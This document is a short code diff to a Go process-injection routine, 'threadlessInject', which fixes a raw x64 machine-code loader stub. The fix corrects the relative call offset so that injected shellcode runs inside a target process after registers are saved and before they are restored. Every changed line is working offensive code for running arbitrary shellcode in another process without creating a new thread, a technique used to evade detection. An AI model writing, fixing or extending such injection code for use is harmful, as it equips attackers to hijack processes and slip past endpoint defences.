@@ -180,7 +180,8 @@ func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string
 		// sub rsp, 0x40 - allocate shadow space
 		0x48, 0x83, 0xEC, 0x40,
 		// call shellcode (relative call to shellcode immediately following loader)
-		0xE8, 0x0C, 0x00, 0x00, 0x00,
+		// Offset is 0x12 (18 bytes) to skip: add rsp (4) + pop regs (11) + jmp (2) + nop (1)
+		0xE8, 0x12, 0x00, 0x00, 0x00,
 		// add rsp, 0x40 - cleanup shadow space
 		0x48, 0x83, 0xC4, 0x40,
 		// Pop all registers to restore state
